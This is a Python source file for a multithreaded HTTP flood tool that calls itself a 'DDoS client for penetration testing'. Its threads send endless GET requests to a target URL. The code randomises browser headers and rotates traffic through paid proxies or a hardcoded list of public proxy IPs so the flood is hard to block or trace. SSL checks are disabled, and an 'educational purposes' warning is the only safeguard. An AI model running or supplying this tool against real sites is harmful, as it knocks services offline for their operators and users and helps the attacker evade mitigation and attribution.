"""
DDoS Client for penetration testing
This client sends HTTP requests to a target to test server resilience.
"""

import requests
import random
import time
import threading
from typing import List, Optional, Dict
import urllib3
import netifaces
from itertools import cycle
import warnings

# Disable SSL warnings for self-signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

REQUEST_TIMEOUT = 10
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15",
]

# ======================================================
# PAID PROXIES SECTION
# ======================================================
# Add your paid proxies here in the format:
# "http://username:password@proxy_host:port" or "http://proxy_host:port"
PAID_PROXIES = [
    # Example formats:
    # "http://user:pass@proxy1.example.com:8080",
    # "http://proxy2.example.com:8080",
    # "https://proxy3.example.com:443",
]

# ======================================================
# SAMPLE FREE PROXIES (for educational purposes only)
# ======================================================
SAMPLE_FREE_PROXIES = [
    "http://103.152.112.172:80",
    "http://103.216.51.201:80",
    "http://103.216.51.202:80",
    "http://103.216.51.203:80",
    "http://103.216.51.204:80",
    "http://103.216.51.205:80",
    "http://103.216.51.206:80",
    "http://103.216.51.207:80",
]


class DDoSClient:
    def __init__(self, target: str, num_threads: int = 50):
        """
        Initialize DDoS client

        Args:
            target: Target URL
            num_threads: Number of concurrent threads
        """
        self.target = target
        self.num_threads = num_threads
        self.stop_attack = False
        self.stats = {
            'requests_sent': 0,
            'success_count': 0,
            'error_count': 0
        }
        self.lock = threading.Lock()

        self.proxies = []
        self.interfaces = []
        self.proxy_cycle = None
        self.interface_cycle = None

        self._detect_network_interfaces()

    def _detect_network_interfaces(self):
        """Detect available network interfaces"""
        try:
            interfaces = netifaces.interfaces()
            ip_addresses = []

            for interface in interfaces:
                # Skip loopback and some virtual interfaces
                if interface.startswith(('lo', 'docker', 'veth', 'br-', 'tun')):
                    continue

                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    for addr_info in addrs[netifaces.AF_INET]:
                        ip = addr_info.get('addr')
                        if ip and not ip.startswith('127.'):
                            ip_addresses.append(ip)

            self.interfaces = ip_addresses
            print(f"[INFO] Detected {len(self.interfaces)} network interfaces: {self.interfaces}")

        except Exception as e:
            print(f"[WARNING] Could not detect network interfaces: {e}")
            self.interfaces = []

    def set_proxies(self, proxy_list: List[str]):
        """
        Set proxy list for IP rotation

        Args:
            proxy_list: List of proxy strings (e.g., ['http://1.2.3.4:8080', 'socks5://5.6.7.8:1080'])
        """
        self.proxies = proxy_list
        if proxy_list:
            self.proxy_cycle = cycle(proxy_list)
            print(f"[INFO] Configured {len(proxy_list)} proxies for rotation")
        else:
            self.proxy_cycle = None

    def use_paid_proxies(self):
        """Use paid proxies from the PAID_PROXIES list"""
        if not PAID_PROXIES:
            print("[WARNING] No paid proxies configured in PAID_PROXIES list!")
            print("[INFO] Please add your paid proxies to the PAID_PROXIES list in the code.")
            return False

        self.set_proxies(PAID_PROXIES)
        print(f"[INFO] Using {len(PAID_PROXIES)} paid proxies for IP rotation")
        return True

    def test_proxy_connectivity(self, proxy_url: str, test_url: str = "http://httpbin.org/ip") -> bool:
        """
        Test if a proxy is working by making a simple request

        Args:
            proxy_url: Proxy URL to test
            test_url: URL to test with (default: httpbin.org/ip)

        Returns:
            True if proxy works, False otherwise
        """
        try:
            proxies = {"http": proxy_url, "https": proxy_url}
            response = requests.get(
                test_url,
                proxies=proxies,
                timeout=10,
                verify=False
            )
            if response.status_code == 200:
                print(f"[PROXY-TEST] ✓ Proxy {proxy_url} is working")
                return True
            else:
                print(f"[PROXY-TEST] ✗ Proxy {proxy_url} returned status {response.status_code}")
                return False
        except Exception as e:
            print(f"[PROXY-TEST] ✗ Proxy {proxy_url} failed: {str(e)[:50]}...")
            return False

    def use_sample_free_proxies(self, test_proxies: bool = True):
        """Use sample free proxies for educational purposes (WARNING: unreliable)"""
        warnings.warn(
            "Using free public proxies is unreliable and may pose security risks. "
            "This is for educational purposes only in authorized testing environments.",
            UserWarning
        )

        if test_proxies:
            print("[INFO] Testing proxy connectivity (this may take a moment)...")
            working_proxies = []
            for proxy in SAMPLE_FREE_PROXIES[:5]:  # Test only first 5 to save time
                if self.test_proxy_connectivity(proxy):
                    working_proxies.append(proxy)

            if working_proxies:
                print(f"[INFO] Found {len(working_proxies)} working proxies")
                self.set_proxies(working_proxies)
            else:
                print("[WARNING] No working proxies found in initial test")
                print("[INFO] Proceeding with all sample proxies (expect many failures)...")
                self.set_proxies(SAMPLE_FREE_PROXIES)
        else:
            self.set_proxies(SAMPLE_FREE_PROXIES)

        print(f"[WARNING] Using {len(self.proxies)} sample free proxies - these may not work!")

    def _get_next_proxy(self) -> Optional[str]:
        """Get next proxy from rotation"""
        if self.proxy_cycle:
            return next(self.proxy_cycle)
        return None

    def _get_next_interface(self) -> Optional[str]:
        """Get next interface IP for binding"""
        if self.interfaces:
            if not hasattr(self, '_interface_cycle') or self._interface_cycle is None:
                self._interface_cycle = cycle(self.interfaces)
            return next(self._interface_cycle)
        return None

    def _get_headers(self) -> Dict[str, str]:
        """
        Generate randomized headers for each request

        Returns:
            Dictionary of HTTP headers
        """
        return {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }

    def _make_request(self, session) -> Optional[requests.Response]:
        """
        Make a single HTTP request with proxy/interface rotation

        Args:
            session: Requests session object

        Returns:
            Response object or None if failed
        """
        proxy = None
        try:
            proxy = self._get_next_proxy()
            interface_ip = self._get_next_interface()

            # Configure proxies if available
            proxies = None
            if proxy:
                proxies = {"http": proxy, "https": proxy}

            # Debug information - show what we're trying to use
            if proxy:
                print(f"[DEBUG] Attempting request with proxy: {proxy}")
            else:
                print(f"[DEBUG] No proxy configured, using direct connection")

            response = session.get(
                self.target,
                headers=self._get_headers(),
                timeout=REQUEST_TIMEOUT,
                proxies=proxies,
                verify=False  # Disable SSL verification for testing
            )

            if proxy:
                print(f"[DEBUG] Request successful via proxy {proxy}")
            else:
                print(f"[DEBUG] Direct request successful")

            return response

        except requests.exceptions.ConnectionError as e:
            error_msg = str(e)[:100] + "..." if len(str(e)) > 100 else str(e)
            if proxy:
                print(f"[DEBUG] Connection error with proxy {proxy}: {error_msg}")
            else:
                print(f"[DEBUG] Direct connection error: {error_msg}")
            return None
        except requests.exceptions.Timeout as e:
            error_msg = str(e)[:100] + "..." if len(str(e)) > 100 else str(e)
            if proxy:
                print(f"[DEBUG] Timeout with proxy {proxy}: {error_msg}")
            else:
                print(f"[DEBUG] Direct timeout error: {error_msg}")
            return None
        except requests.exceptions.ProxyError as e:
            error_msg = str(e)[:100] + "..." if len(str(e)) > 100 else str(e)
            if proxy:
                print(f"[DEBUG] Proxy error {proxy}: {error_msg}")
            else:
                print(f"[DEBUG] Unexpected proxy error (no proxy set): {error_msg}")
            return None
        except Exception as e:
            error_msg = str(e)[:100] + "..." if len(str(e)) > 100 else str(e)
            if proxy:
                print(f"[DEBUG] Other error with proxy {proxy}: {error_msg}")
            else:
                print(f"[DEBUG] Other direct error: {error_msg}")
            return None

    def attack(self):
        """Execute the DDoS attack"""
        print(f"[+] Starting DDoS attack on {self.target}")
        print(f"[+] Using {self.num_threads} threads")
        if self.proxies:
            print(f"[+] IP rotation enabled with {len(self.proxies)} proxies")
        if self.interfaces:
            print(f"[+] Detected {len(self.interfaces)} network interfaces for binding")
        print("[+] Press Ctrl+C to stop the attack")
        print()

        threads = []

        for i in range(self.num_threads):
            thread = threading.Thread(target=self._attack_worker)
            thread.daemon = True
            threads.append(thread)
            thread.start()

            # Small delay to prevent overwhelming at startup
            time.sleep(0.01)

        try:
            while not self.stop_attack:
                time.sleep(0.1)
        except KeyboardInterrupt:
            print("\n[!] Stopping attack...")
            self.stop_attack = True

        for thread in threads:
            thread.join(timeout=2)

        self._print_summary()

    def _attack_worker(self):
        """Worker function for individual threads"""
        with requests.Session() as session:
            while not self.stop_attack:
                response = self._make_request(session)

                with self.lock:
                    self.stats['requests_sent'] += 1

                    if response and 200 <= response.status_code < 400:
                        self.stats['success_count'] += 1
                        status = response.status_code
                    else:
                        self.stats['error_count'] += 1
                        status = "ERR" if not response else response.status_code

                    if self.stats['requests_sent'] % 10 == 1:
                        print(f"[{self.stats['requests_sent']}] {status} - {self.target}")

    def _print_summary(self):
        """Print attack summary"""
        print("\n[+] Attack Summary:")
        print(f"    Total Requests Sent: {self.stats['requests_sent']}")
        print(f"    Successful Requests: {self.stats['success_count']}")
        print(f"    Failed Requests: {self.stats['error_count']}")

        if self.stats['requests_sent'] > 0:
            success_rate = (self.stats['success_count'] / self.stats['requests_sent']) * 100
            print(f"    Success Rate: {success_rate:.2f}%")


def create_ddos_client(target: str, num_threads: int = 50) -> DDoSClient:
    """
    Factory function to create DDoS client

    Args:
        target: Target URL
        num_threads: Number of concurrent threads

    Returns:
        Configured DDoSClient instance
    """
    return DDoSClient(target, num_threads)
